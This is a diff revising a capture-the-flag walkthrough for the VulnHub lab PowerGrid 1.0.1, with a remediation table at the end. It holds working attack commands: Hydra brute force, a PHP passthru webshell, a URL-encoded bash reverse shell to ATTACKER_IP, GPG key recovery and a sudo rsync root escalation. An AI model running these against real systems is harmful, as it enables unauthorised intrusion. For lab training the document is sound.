@@ -1,163 +1,205 @@
 # PowerGrid: 1.0.1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | powergrid.vh (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.56.x (add to /etc/hosts as `powergrid.vh`) |
 | **Difficulty** | Hard |
 | **OS** | Linux |
-| **Author** | TheCyberGeek & Phpr0phyt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/powergrid-101,485/) |
+| **Goal** | 4 flags |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`nmap` → web user enumeration → Hydra HTTP-Auth brute force → Roundcube webmail (EDB-40892 RCE) → PHP webshell → reverse shell → GPG-encrypted SSH key decryption → SSH pivot into Docker → `sudo rsync` privesc → root across two hosts
+PowerGrid: 1.0.1 is an advanced multi-stage machine. The path involves brute-forcing HTTP Basic Auth on a Roundcube webmail instance (Exploit-DB 40892 RCE), decrypting a PGP-protected SSH private key, pivoting into a Docker container via SSH, and escalating to root using `sudo rsync`.
 
 ## Methodology
 
-1. Network discovery and hostname setup
-2. Web enumeration for usernames
-3. HTTP Basic Auth brute force with Hydra
-4. Roundcube RCE (CVE-2017-16651 / EDB-40892)
+1. Host discovery and full port scan
+2. Web enumeration — three usernames discovered
+3. HTTP Basic Auth brute-force with Hydra
+4. Roundcube RCE (EDB-40892)
 5. PHP webshell upload and reverse shell
-6. GPG key decryption and SSH pivot into Docker
-7. sudo rsync privilege escalation
+6. Lateral movement — password reuse for user `p48`
+7. GPG key decryption to recover SSH private key
+8. Docker container pivot via SSH
+9. Root escalation via `sudo rsync`
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Setup and Port Scan
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
-# Add to /etc/hosts:
-echo "192.168.X.X powergrid.vh" >> /etc/hosts
+netdiscover -i eth0
+# Add target to /etc/hosts
+echo "192.168.56.x powergrid.vh" >> /etc/hosts
+```
 
+### Port Scan
+
+```bash
 nmap -A -p- powergrid.vh
 ```
 
-Services: 80 (HTTP/Roundcube webmail), 143 (IMAP), 993 (IMAPS), possibly 22 (SSH).
+![nmap](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
-
----
+The web service exposes a directory listing of usernames and runs Roundcube webmail. Note: SSH is not directly exposed on the host — it runs inside a Docker container.
 
 ## Step 2: User Enumeration
 
-Browse the web application. The landing page or directory listing reveals usernames: **deez1**, **p48**, **all2**.
+Browse to `http://powergrid.vh/`. The page lists three users:
 
-![Web enumeration](images/02-enum.png)
+- `deez1`
+- `p48`
+- `all2`
 
----
-
-## Step 3: HTTP Basic Auth Brute Force
+## Step 3: Web Enumeration
 
 ```bash
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt powergrid.vh http-get /zmail/ -e nsr
+dirsearch -u http://powergrid.vh/ -e php,html,txt
 ```
 
-Where `/zmail/` is the password-protected Roundcube directory. Credentials obtained for one of the three users.
+![Web Enum](images/02-web-enum.png)
 
----
+A directory protected by HTTP Basic Authentication is discovered (Roundcube webmail login).
 
-## Step 4: Roundcube RCE (EDB-40892)
+## Step 4: HTTP Basic Auth Brute-Force
 
-Log into Roundcube webmail. Check version and apply exploit-db 40892 (Roundcube < 1.3.3 remote code execution):
+Brute-force each discovered username against the protected directory:
 
 ```bash
-# Download exploit
-searchsploit -m 40892
-
-# Check for a PGP-encrypted email; use the brute-forced password to decrypt the private key
-# The email contains an encrypted message — password reuse decrypts the GPG key
-
-python 40892.py http://powergrid.vh/zmail/ <user> <pass>
-# Creates info.php as proof-of-concept
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt powergrid.vh http-get /PATH_TO_ROUNDCUBE/
 ```
 
-Upload a URL-encoded PHP webshell to the web root:
+Valid credentials found. Log in to Roundcube.
+
+## Step 5: Roundcube RCE — EDB-40892
+
+The Roundcube version is vulnerable to authenticated RCE (Exploit-DB 40892). Confirm by creating a proof-of-concept PHP info file, then upload a PHP webshell:
 
 ```bash
-# Via the exploit or manually upload:
-# <?php passthru($_GET['cmd']); ?>
-# Test: http://powergrid.vh/zmail/cmd.php?cmd=id
+# Webshell content
+echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
+
+# Verify upload and execution
+curl "http://powergrid.vh/PATH/shell.php?cmd=id"
 ```
 
 ![Roundcube RCE](images/03-roundcube-rce.png)
 
----
-
-## Step 5: Reverse Shell
+## Step 6: Reverse Shell
 
 ```bash
+# Listener
 nc -lvp 4444
+
+# URL-encoded reverse shell payload via cmd parameter
+curl "http://powergrid.vh/PATH/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
 ```
 
-Trigger via webshell (URL-encoded):
-
-```
-http://powergrid.vh/zmail/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
-```
-
-Shell received as `www-data`.
-
----
-
-## Step 6: GPG Key Decryption and SSH Pivot
-
-Find the GPG private key in `/home/`:
+Stabilize the shell:
 
 ```bash
-find /home -name "*.asc" -o -name "*.gpg" 2>/dev/null
-# Import and decrypt using the Roundcube user's password
-gpg --import <keyfile>
-# Or: decrypt online if native gpg fails
-
-# Recovered SSH private key → connect to Docker container
-chmod 600 ssh_key
-ssh -i ssh_key p48@<docker_container_ip>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo; fg
 ```
 
-Read flag 2 inside the container.
+Check for flags:
 
-![Privesc chain](images/04-privesc.png)
+```bash
+find / -name "flag*" 2>/dev/null
+# Flag 1 found
+```
 
----
+## Step 7: Lateral Movement to p48
 
-## Step 7: Privilege Escalation via sudo rsync
+Check the inbox email. It contains a PGP-encrypted message. The same password used for webmail is reused as the PGP passphrase:
 
-Inside the Docker container:
+```bash
+# List home directories
+ls /home/
+
+# Switch to p48 using the webmail password
+su p48
+```
+
+The GPG private key is in `p48`'s home directory. Decrypt the PGP email to retrieve an SSH private key:
+
+```bash
+gpg --import /home/p48/.gnupg/private-key.asc
+gpg --decrypt pgp_message.asc
+# Enter the passphrase (same as webmail password)
+# Output: SSH private key
+```
+
+Save the decrypted SSH key:
+
+```bash
+echo "-----BEGIN RSA PRIVATE KEY-----
+...
+-----END RSA PRIVATE KEY-----" > /tmp/id_rsa_docker
+chmod 600 /tmp/id_rsa_docker
+```
+
+## Step 8: Docker Container Pivot
+
+Discover the Docker network:
+
+```bash
+ip route
+# Note the Docker bridge network (e.g., 172.17.0.0/16)
+
+# Scan for SSH on the Docker network
+for i in $(seq 1 254); do (ping -c1 172.17.0.$i &>/dev/null && echo "172.17.0.$i up") & done
+```
+
+![Docker Pivot](images/04-docker-pivot.png)
+
+Connect to the Docker container via SSH:
+
+```bash
+ssh -i /tmp/id_rsa_docker user@172.17.0.x
+```
+
+Find Flag 2 and read hint 2 inside the container.
+
+## Step 9: Privilege Escalation — sudo rsync
+
+Inside the container, check sudo permissions:
 
 ```bash
 sudo -l
-# User can run: (root) NOPASSWD: /usr/bin/rsync
-
-# GTFOBins rsync:
-sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
-# or:
-sudo rsync --no-iconv -a --rsync-path="rsync --no-iconv && sh" 127.0.0.1:/ /tmp/
-
-id    # uid=0(root)
-cat /root/flag3.txt
+# (root) NOPASSWD: /usr/bin/rsync
 ```
 
-Pivot to final host and read the last flag.
+Escalate using the GTFOBins `rsync` technique:
 
-![Root shell](images/05-root.png)
+```bash
+sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+```
 
----
+Root shell obtained. Read Flag 3 and Flag 4:
+
+```bash
+cat /root/flag3.txt
+cat /root/flag4.txt
+```
+
+![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Credential reuse across services** — the Roundcube password also decrypted the GPG key; test every password against every service found
-2. **Roundcube RCE (EDB-40892)** — webmail platforms are often overlooked; keep them patched
-3. **sudo rsync LPE** — rsync's `--rsync-path` flag allows arbitrary command execution when run as root
-4. **Docker breakout via SSH pivot** — internal Docker networks are reachable once you have a shell on the host
+- Roundcube webmail can be a vector for authenticated RCE — keep it patched.
+- Password reuse across services (webmail, GPG, SSH) leads to full chain compromise.
+- Docker containers sharing network with the host extend the attack surface.
+- `sudo rsync` without a password is trivially exploitable via GTFOBins.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| HTTP Basic Auth brute-forceable | Enable account lockout or use client certificates |
-| Roundcube < 1.3.3 RCE | Upgrade Roundcube to latest version |
-| Password reuse (webmail = GPG key) | Use unique passwords; rotate after discovery |
-| sudo rsync NOPASSWD | Remove from sudoers; audit all sudo rules |
-| Docker network accessible from host shell | Network segment Docker; restrict outbound from web shell |
+| HTTP Basic Auth brute-force | Enforce account lockout; use strong unique credentials |
+| Roundcube RCE (EDB-40892) | Update Roundcube to a patched version |
+| Password reuse | Use a unique, strong password for each service |
+| Docker container network exposure | Isolate Docker networks; do not expose container SSH to host |
+| `sudo rsync` NOPASSWD | Remove the sudo rule; use least-privilege for service accounts |
